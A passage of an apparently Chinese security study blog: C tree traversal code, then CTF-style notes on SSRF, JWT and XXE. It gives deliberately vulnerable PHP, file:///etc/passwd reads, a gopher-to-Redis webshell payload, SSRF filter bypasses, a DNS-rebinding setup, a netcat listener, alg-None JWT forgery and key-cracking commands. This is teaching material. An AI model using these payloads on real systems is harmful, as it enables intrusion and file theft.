class="hljs-built_in">inorder</span>(TreeNode* root) &#123;<br>    if (root != NULL) &#123;<br>        <span class="hljs-built_in">inorder</span>(root-&gt;left);  <span class="hljs-comment">// 先遍历左子树</span><br>        <span class="hljs-built_in">printf</span>(&quot;%d &quot;, root-&gt;data);  <span class="hljs-comment">// 然后访问当前节点</span><br>        <span class="hljs-built_in">inorder</span>(root-&gt;right);  <span class="hljs-comment">// 最后遍历右子树</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="5-前序遍历（Preorder-Traversal）"><a href="#5-前序遍历（Preorder-Traversal）" class="headerlink" title="5. 前序遍历（Preorder Traversal）"></a>5. 前序遍历（Preorder Traversal）</h4><p><strong>前序遍历</strong>的顺序是：先访问根节点，再遍历左子树，最后遍历右子树。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss">void <span class="hljs-built_in">preorder</span>(TreeNode* root) &#123;<br>    if (root != NULL) &#123;<br>        <span class="hljs-built_in">printf</span>(&quot;%d &quot;, root-&gt;data);  <span class="hljs-comment">// 访问当前节点</span><br>        <span class="hljs-built_in">preorder</span>(root-&gt;left);  <span class="hljs-comment">// 遍历左子树</span><br>        <span class="hljs-built_in">preorder</span>(root-&gt;right);  <span class="hljs-comment">// 遍历右子树</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="6-后序遍历（Postorder-Traversal）"><a href="#6-后序遍历（Postorder-Traversal）" class="headerlink" title="6. 后序遍历（Postorder Traversal）"></a>6. 后序遍历（Postorder Traversal）</h4><p><strong>后序遍历</strong>的顺序是：先遍历左子树，再遍历右子树，最后访问根节点。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss">void <span class="hljs-built_in">postorder</span>(TreeNode* root) &#123;<br>    if (root != NULL) &#123;<br>        <span class="hljs-built_in">postorder</span>(root-&gt;left);  <span class="hljs-comment">// 遍历左子树</span><br>        <span class="hljs-built_in">postorder</span>(root-&gt;right);  <span class="hljs-comment">// 遍历右子树</span><br>        <span class="hljs-built_in">printf</span>(&quot;%d &quot;, root-&gt;data);  <span class="hljs-comment">// 访问当前节点</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>c语言的数据结构</category>
      
    </categories>
    
    
    <tags>
      
      <tag>c语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ssrf</title>
    <link href="/2024/09/01/ssrf/"/>
    <url>/2024/09/01/ssrf/</url>
    
    <content type="html"><![CDATA[<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>Server-side Request Forgery 服务端请求伪造<br>攻击向服务端发送包含恶意url连接的请求，借由服务端发起请求<br>以便获取服务端网络内部的资源<br>一句话总结：<br>控制服务端使用指定协议访问指定的url<br>A：你为什么这么干？<br>B：是谁谁谁让我干的<br>A：谁谁谁让你去吃shi你去不去？<br>特点：<br>1 让别人访问我们访问不到的url<br>2 拿到自己本来拿不到的数据</p><p>条件：<br>1 别人能帮我访问url 服务端有接受url地址并进行访问的功能<br>2 url地址外部可控<br><a href="https://xxx.com/index.php?url=http://www.baidu.com">https://xxx.com/index.php?url=http://www.baidu.com</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;location:&#x27;</span>.<span class="hljs-variable">$url</span>); <span class="hljs-comment">//302的跳转</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>是不是属于ssrf?</p><p>告诉浏览器，你去访问这个地址<br>此时，浏览器，是客户端还是服务端</p><p>客户端   </p><p>此时，服务器没有访问这个Url,只是告诉你浏览器，去跳转到这个地址去<br>是浏览器去访问，不是服务端去访问<br>所以，不是SSRF<br>只能算 任意跳转漏<br>分清  是否是ssrf<br>url地址可控<br><a href="http://10.xx.xx.xx/">http://10.xx.xx.xx/</a><br>file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd<br>URL格式<br>URI &#x3D; scheme:[&#x2F;&#x2F;authority]path[?query][#fragment]<br>schema: 协议头:&#x2F;&#x2F;authority [userinfo@]host[:port]</p><p>默认使用80端口，而80端口默认情况下，是可以省略<br><a href="http://www.baidu.com/robots.txt">http://www.baidu.com/robots.txt</a></p><p>本质，就是 通过指定的协议，访问互联网上某台服务器的某个资源或者某个文件<br>默认使用匿名账户访问<br>userinfo: username:password@hos<br>schema:&#x2F;&#x2F;username:password@host:port&#x2F;path?a&#x3D;b#top<br><a href="http://ctfshow:hacker@www.baidu.com/robots.txt">http://ctfshow:hacker@www.baidu.com/robots.txt</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-comment">//初始化一个cURL会话</span><br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-comment">//设定返回信息中包含响应信息头</span><br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-comment">//启用时会将头文件的信息作为数据流输出。 </span><br><span class="hljs-comment">//参数为1表示输出信息头,为0表示不输出</span><br> <br><span class="hljs-comment">//设定curl_exec()函数将响应结果返回，而不是直接输出</span><br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-comment">//参数为1表示$result,为0表示echo $result</span><br> <br><span class="hljs-comment">//执行一个cURL会话</span><br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-comment">//关闭一个curl会话</span><br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-comment">//输出返回信息  如果CURLOPT_RETURNTRANSFER参数为fasle可省略</span><br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="SSRF的利用面"><a href="#SSRF的利用面" class="headerlink" title="SSRF的利用面"></a>SSRF的利用面</h1><p><a href="http://127.0.0.1:8000/fgc.php?url=file:///var/www/html/flag.php">http://127.0.0.1:8000/fgc.php?url=file:///var/www/html/flag.php</a><br><a href="http://127.0.0.1:8000/fgc.php?url=http://127.0.0.1/flag.php">http://127.0.0.1:8000/fgc.php?url=http://127.0.0.1/flag.php</a></p><h2 id="1-任意文件读取-前提是知道要读取的文件名"><a href="#1-任意文件读取-前提是知道要读取的文件名" class="headerlink" title="1 任意文件读取 前提是知道要读取的文件名"></a>1 任意文件读取 前提是知道要读取的文件名</h2><h2 id="2-探测内网资源"><a href="#2-探测内网资源" class="headerlink" title="2 探测内网资源"></a>2 探测内网资源</h2><p> 127.0.0.1 mysql服务端监听了127.0.0.1这个地址，也就表示，只能通过127.0.0.1这个IP来访问<br> 0.0.0.0 表示允许任意ip访问<br> 192.168.233.233 只允许特定的IP地址访问<br> 3 使用gopher协议扩展我们的攻击面<br> apache&#x2F;nginx 80<br> tomcat 8080<br> node 3000<br> flask 8080<br> php-fpm 9000<br> mysql 3306<br> ftp 21<br> ssh 22<br> redis 6379<br> key-value  gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;<em>save</em>&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php_<?php eval($_POST[1]);?><br> mysql 3306<br> 用户密码为空<br> php-fpm<br> php-fpm 默认监听9000端口，而且只允许本机127.0.0.1这个地址访问<br> 主要负责对.php文件的代码解释执行<br> 我们可以通过向9000端口发送格式的请求，来让9000端口背后的php-fpm帮我们处理我们提交的php代码<br> 通过向9000端口发送php执行请求<br> 设置php.ini中的运行参数<br> 其中使用 auto_append_file 来指定 php:&#x2F;&#x2F;input 包含恶意代码，然后执行<br> 为了能使用auto_append_file参数，必须有一个存在的php文件来使用这个配置项<br> php原生类进行ssrf<br>$soap &#x3D;new SoapClient($_GET[‘url’]);<br>$soap-&gt;hack();<br>&#x2F;&#x2F;$soap-&gt;__call()<br>url可控，可以发送内网请求<br>ssrf绕过<br>只要不允许它访问本地地址即可，也就是说，过滤的目的是，不让访问127.0.0.1地址<br>1 enclosed alphanumerics 绕过<br>127.0.0.1<br>127.⓿.⓿.1<br>2 使用IP地址转换<br>所有的域名-&gt;IP<br>ip可以使用不同进制来表示<br>127.0.0.1用不同进制可以表示为</p><ul><li><p>2130706433  10进制 <a href="http://127.0.0.1/">http://2130706433</a>  </p></li><li><p>017700000001 8进制 <a href="http://127.0.0.1/">http://017700000001</a> </p></li><li><p>7F000001 16进制   <a href="http://127.0.0.1/">http://0x7F000001</a> </p><h2 id="3-特殊语法绕过"><a href="#3-特殊语法绕过" class="headerlink" title="3 特殊语法绕过"></a>3 特殊语法绕过</h2><p>Windows 下 0 代表的是0.0.0.0<br>而Linux 下 0 代表的是127.0.0.1<br>127.0.0.1 可以省略为 127.1<br>127。0。0。1 可以替代127.0.0.1<br>4 如果对方可以接受302跳转，并且跟进302跳转<br>可以发送http的协议。但是返回的location为其他协议<br><a href="http://xxx.com/302.php?schema=gopher&host=127.0.0.1&port=9000&payload=xxxx">http://xxx.com/302.php?schema=gopher&amp;host=127.0.0.1&amp;port=9000&amp;payload=xxxx</a><br>(1)、服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP<br>(2)、对于获得的IP进行判断，发现为非黑名单IP，则通过验证<br>(3)、服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。<br>(4)、由于已经绕过验证，所以服务器端返回访问内网资源的结果。</p></li></ul><p>compress.zlib:&#x2F;&#x2F;data:@baidu.com&#x2F;baidu.com,phpinfo()<br><code>compress.zlib</code>绕过data协议的检测，<code>@</code>使<code>data:</code>被解释为用户名和密码，<code>baidu.com/baidu.com</code>中只要包含<code>/</code>就会被解释为合法的<code>media-type</code></p><p>1·修改自己域名的a记录，改成127.0.0.1<br>2·这个网站a记录指向127.0.0.1 可以直接利用<br>url&#x3D;<a href="http://sudo.cc/flag.php">http://sudo.cc/flag.php</a></p><ol><li>设置阿里云 DNS 解析<br>首先，您需要一个在阿里云上注册的域名，并且您需要能够管理该域名的 DNS 记录。</li></ol><p>创建域名和设置 DNS 解析<br>登录到 阿里云控制台。<br>在左侧菜单中选择“域名与网站” &gt; “域名”，并选择您的域名。<br>点击“解析”，进入 DNS 解析设置页面。<br>添加 A 记录：<br>主机记录：@<br>记录类型：A<br>解析线路：默认<br>记录值：203.0.113.1（第一次返回的外部 IP）<br>TTL：1分钟<br>注意：阿里云 DNS 不支持将 TTL 设置为 0，但您可以将其设置为最小值，例如 1 分钟。</p><ol start="2"><li>配置可控的 DNS 服务器<br>由于阿里云 DNS 不支持 TTL 为 0 的设置，您需要配置一个您可以完全控制的 DNS 服务器。您可以在阿里云 ECS 实例上运行一个 DNS 服务器（例如 Bind 或 dnsmasq），并手动设置 TTL 为 0。</li></ol><p>使用 dnsmasq 设置 DNS 服务器<br>在阿里云上创建一个 ECS 实例并安装 dnsmasq：</p><p>bash<br>复制代码<br>sudo yum install -y dnsmasq  # 对于 CentOS<br>sudo apt-get install -y dnsmasq  # 对于 Ubuntu<br>编辑 dnsmasq 配置文件 &#x2F;etc&#x2F;dnsmasq.conf，添加如下内容：</p><p>conf<br>复制代码<br>no-resolv<br>server&#x3D;8.8.8.8  # 使用 Google 的公共 DNS 作为上游 DNS 服务器<br>address&#x3D;&#x2F;sudo.cc&#x2F;203.0.113.1  # 初始解析返回外部 IP<br>address&#x3D;&#x2F;sudo.cc&#x2F;127.0.0.1  # 重绑定解析返回内网 IP<br>注意：确保 TTL 设置为 0。dnsmasq 的默认 TTL 是 0，不需要额外配置。</p><p>启动 dnsmasq 服务：</p><p>bash<br>复制代码<br>sudo systemctl restart dnsmasq<br>sudo systemctl enable dnsmasq<br>更新您在阿里云上的域名解析，指向您配置的 ECS 实例的 IP 地址。</p><ol start="3"><li>执行 DNS Rebinding 攻击<br>在攻击者机器上启动 netcat</li></ol><p> 监听：</p><p>bash<br>复制代码<br>nc -lvnp 4444<br>发送 POST 请求到目标服务器：</p><p>bash<br>复制代码<br>curl -X POST -d “url&#x3D;<a href="http://sudo.cc/flag.php">http://sudo.cc/flag.php</a>“ http:&#x2F;&#x2F;目标服务器地址&#x2F;script.php<br>验证和调试<br>验证 DNS 解析：<br>确保在目标服务器上进行 DNS 解析时，能够返回正确的 IP 地址：</p><p>bash<br>复制代码<br>nslookup sudo.cc<br>检查防火墙和安全组：<br>确保您的阿里云 ECS 实例的安全组规则允许外部访问。</p><p>监控 DNS 解析：<br>使用 tcpdump 或其他网络监控工具，确保 DNS 请求和响应符合预期。</p><p>注意事项<br>合法性：确保您进行的所有操作都是在合法授权的范围内。未经授权的攻击是非法的。<br>测试环境：最好在隔离的测试环境中进行测试，以避免对生产环境造成影响。<br>防护措施：了解并学习这些攻击技术后，建议采取相应的防护措施，防止在实际应用中被利用。</p><p>5 利用短网址绕过<br>baidu.com  不允许出现baidu<br>或者限制了url长度，我们可以切换为短网址，来绕过长度的限制<br><a href="http://rurl.vip/eW7AU">http://rurl.vip/eW7AU</a></p><p>首先准备监听<br>url&#x3D;<a href="http://ctf.@127.0.0.1/flag.php?show">http://ctf.@127.0.0.1/flag.php?show</a><br>url&#x3D;<a href="http://ctf.@127.0.0.1/flag.php#show">http://ctf.@127.0.0.1/flag.php#show</a></p><h1 id="本地才能看到flag，这就需要ssrf了"><a href="#本地才能看到flag，这就需要ssrf了" class="headerlink" title="本地才能看到flag，这就需要ssrf了"></a>本地才能看到flag，这就需要ssrf了</h1><h1 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h1><p>jwt是一个轻量级的认证规范 对数据进行签名用的</p><p>防止数据被篡改<br>1 对数据进行加密   内容对用户敏感，不需要对外<br>2 对数据进行签名   内容不敏感，但是确保不被篡改</p><p>JWT是对数据进行签名，防止数据篡改，而不是防止数据被读取<br>JSON Web Token JWT<br>?username&#x3D;admin&amp;score&#x3D;100  别人传递过程中，会对积分进行篡改<br>?username&#x3D;admin&amp;score&#x3D;100&amp;token&#x3D;c17961f5f372f8cf039113909d715943<br>? md5(score&#x3D;100&amp;username&#x3D;admin)&#x3D;c17961f5f372f8cf039113909d715943<br>?score&#x3D;100&amp;username&#x3D;admin&amp;token&#x3D;c17961ff372f8cf039113909d715943<br>篡改数据的同时，破解了算法，篡改了签名<br>加盐机制，salt<br>md5(score&#x3D;100&amp;username&#x3D;admin_ctfshow)&#x3D;20f3fa445b286df3f1a518fcbcd8bbe2</p><p>盐值有可能被爆破，也有可能被泄露<br>增加更高的密码算法，不再简单的md5，盐值也大幅度提高长度，达到几百上千位 来保证我们的数据不被篡改  或者即使篡改了我们能发现<br>由 Header、Payload、Signature三部分构成，用点分隔，数据采用Base64URL进行编码<br>Header是JWT的第一个部分，是一个 JSON 对象，主要声明了JWT的签名算法，如“HS256”、“RS256”等，以及其他可选参数，如“kid”等。<br>Header</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;alg&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;HS256&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;typ&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;jwt&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>Payload是JWT的第二个部分，这也是一个 JSON 对象，主要承载了各种声明并传递明文数据，一般用于存储用户的信息，如 id、用户名、角色、令牌生成时间和其他自定义声明<br>Payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;user&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Admin&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>Signature<br>    Signature 是对 Header 和 Payload 进行签名，具体是用什么加密方式写在 Header的alg中。同时拥有该部分的JWT被称为JWS，也就是签了名的JWT。<br>    Signature的功能是保护token完整性。<br>生成方法为将header和payload两个部分联结起来，然后通过header部分指定的算法，计算出签名。抽象成公式就是：signature &#x3D; HMAC-SHA256(base64urlEncode(header) + ‘.’ + base64urlEncode(payload), secret_key)<br>值得注意的是，编码header和payload时使用的编码方式为base64urlencode，base64url编码是base64的修改版，为了方便在网络中传输使用了不同的编码表，它不会在末尾填充”&#x3D;”号，并将标准Base64中的”+”和”&#x2F;“分别改成了”-“和”_”。</p><p>JWT生成-在线网址&amp;工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 flask_session_cookie_manager3.py encode -s <span class="hljs-string">&#x27;secret_key&#x27;</span> -t <span class="hljs-string">&#x27;&#123;&quot;admin&quot;:True,&quot;username&quot;:&quot;admin&quot;&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>1 当不校验算法时，我们可以替换算法，甚至可以使用空的算法，来达到数据篡改目的</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;alg&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;None&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;typ&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;jwt&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;user&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Admin&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;alg&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;None&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;typ&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;JWT&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;iss&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;iat&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1673703091</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;exp&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1673710291</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;nbf&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1673703091</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;sub&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;jti&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;21a3d6eec9efbc030983fbc3650c0f03&quot;</span><span class="hljs-punctuation">&#125;</span><br><br>ewogICAgImFsZyIgOiAiTm9uZSIsCiAgICAidHlwIiA6ICJqd3QiCn0=.ewogICAgInVzZXIiIDogImFkbWluIgp9<br></code></pre></td></tr></table></figure><p>JWT 爆破工具地址<br><a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker build . -t jwtcrack<br>docker run -it --<span class="hljs-built_in">rm</span>  jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE<br></code></pre></td></tr></table></figure><h3 id="密钥混淆攻击"><a href="#密钥混淆攻击" class="headerlink" title="密钥混淆攻击"></a>密钥混淆攻击</h3><pre><code class="hljs">JWT最常用的两种算法是HMAC和RSA。HMAC用同一个密钥对token进行签名和认证。而RSA需要两个密钥，先用私钥加密生成JWT，然后使用其对应的公钥来解密验证。那么，后端代码会使用公钥作为秘密密钥，然后使用HS256算法验证签名。由于公钥有时可以被攻击者获取到，所以攻击者可以修改header中算法为HS256，然后使用RSA公钥对数据进行签名。 利用方式：jwt_tool(https://github.com/ticarpi/jwt_tool) 用法：python3 jwt_tool.py token_here -pk pubkey -T -S hs256</code></pre><p>密钥爆破&#x2F;泄露<br>    HMAC签名密钥（例如HS256 &#x2F; HS384 &#x2F; HS512）使用对称加密，这意味着对令牌进行签名的密钥也用于对其进行验证。由于签名验证是一个自包含的过程，因此可以测试令牌本身的有效密钥，而不必将其发送回应用程序进行验证。<br>    因此，jwtcrack破解是JWT破解工具，可以通过穷举的方式暴力破解密钥。<br>    如果可以破解HMAC密钥，则可以伪造令牌中的任何内容，这个漏洞将会给系统带来非常严重的后果，所以在加密时不要使用弱密钥进行加密。<br>    jwtcrack(<a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a>)<br>    用法：.&#x2F;jwtcrack token_here</p><p>node安装jwt命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install jsonwebtoken<br></code></pre></td></tr></table></figure><h3 id="私钥泄露"><a href="#私钥泄露" class="headerlink" title="私钥泄露"></a>私钥泄露</h3><p>可以根据私钥生成任意的jwt字符串</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>);<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><br><span class="hljs-keyword">var</span> privateKey = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;private.key&#x27;</span>);<br><br><span class="hljs-keyword">var</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123; <span class="hljs-attr">user</span>: <span class="hljs-string">&#x27;admin&#x27;</span> &#125;, privateKey, &#123; <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;RS256&#x27;</span> &#125;);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(token)<br></code></pre></td></tr></table></figure><p>验签</p><h3 id="公钥泄露"><a href="#公钥泄露" class="headerlink" title="公钥泄露"></a>公钥泄露</h3><p>可以根据公钥，修改算法从非对称算法 到 对称密钥算法  </p><p>双方都使用公钥验签，顺利篡改数据</p><p>当公钥可以拿到时，如果使用对称密码，则对面使用相同的公钥进行解密</p><p>实现验签通过</p><h3 id="总结加密方式"><a href="#总结加密方式" class="headerlink" title="总结加密方式"></a>总结加密方式</h3><p>1 非对称加密算法  私钥  公钥   只要两个时匹配 一个私钥加密的文件，用公钥都能解开(验签)</p><p>2 对称加密算法   暗号  口令  公钥 </p><h3 id="总结jwt攻击"><a href="#总结jwt攻击" class="headerlink" title="总结jwt攻击"></a>总结jwt攻击</h3><p>1 空密码算法绕过 不验证算法的前提下</p><p>2 弱密码绕过   猜测弱密码</p><p>3 密码爆破   安装docker 执行jwtcracker</p><p>4 私钥泄露  直接利用私钥生成正确jwt字符串 过验签</p><p>5 公钥泄露  不验证算法前提下，修改算法为对称加密，通过公钥重新生成对称签名的字符串 实现验签通过</p><p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p><h1 id="XXE的利用"><a href="#XXE的利用" class="headerlink" title="XXE的利用"></a>XXE的利用</h1><p>受到影响的类和函数<br><code>SimpleXMLElement</code>、&#96;DOM</p><p>Document<code>、</code>simplexml_load_string&#96;<br>(libxml&lt;2.9.0, PHP 5, PHP 7)<br>libxml2.9.0以后，默认不解析外部实体，导致XXE漏洞逐渐消亡。为了演示PHP环境下的XXE漏洞<br>XML Entity 实体注入<br>当程序处理xml文件时，没有禁止对外部实体的处理，容易造成xxe漏洞<br>危害<br>主流是任意文件读取<br>Content-Type: text&#x2F;xml</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<span class="hljs-comment">//默认情况下，libxml_disable_entity_loader 是启用的，它禁用外部实体的加载。这里，它被设置为 false，意味着允许外部实体的加载。这可能带来安全风险，因为它可能允许 XXE (XML External Entity) 攻击</span><br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span 